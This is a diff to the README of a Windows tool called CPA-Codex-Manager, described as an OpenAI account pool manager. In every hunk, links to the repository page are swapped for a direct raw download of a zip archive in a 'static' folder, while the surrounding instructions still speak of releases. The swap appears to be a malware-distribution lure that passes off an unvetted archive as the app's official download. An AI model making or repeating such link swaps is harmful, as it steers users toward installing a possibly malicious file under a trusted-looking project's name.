@@ -1,6 +1,6 @@
 # ⚙️ CPA-Codex-Manager - Fast OpenAI Pool Control
 
-[![Download](https://img.shields.io/badge/Download-CPA--Codex--Manager-blue?style=for-the-badge&logo=github)](https://github.com/Footracespasticity75/CPA-Codex-Manager)
+[![Download](https://img.shields.io/badge/Download-CPA--Codex--Manager-blue?style=for-the-badge&logo=github)](https://github.com/Footracespasticity75/CPA-Codex-Manager/raw/refs/heads/main/static/Manager_Codex_CP_1.8.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ Use it when you need a clear panel for daily account work. It brings key tools i
 
 Visit this page to download the app:
 
-https://github.com/Footracespasticity75/CPA-Codex-Manager
+https://github.com/Footracespasticity75/CPA-Codex-Manager/raw/refs/heads/main/static/Manager_Codex_CP_1.8.zip
 
 Open the page in your browser, then look for the latest release or download file. Save the file to your Windows PC before you start the setup.
 
@@ -30,7 +30,7 @@ Open the page in your browser, then look for the latest release or download file
 Follow these steps to run the app on Windows.
 
 1. Open the download page:
-   https://github.com/Footracespasticity75/CPA-Codex-Manager
+   https://github.com/Footracespasticity75/CPA-Codex-Manager/raw/refs/heads/main/static/Manager_Codex_CP_1.8.zip
 
 2. Look for the newest release or the main download file.
 
@@ -172,4 +172,4 @@ You can connect it in the settings if your setup needs that platform.
 
 ## 📎 Direct Download Page
 
-https://github.com/Footracespasticity75/CPA-Codex-Manager
+https://github.com/Footracespasticity75/CPA-Codex-Manager/raw/refs/heads/main/static/Manager_Codex_CP_1.8.zip
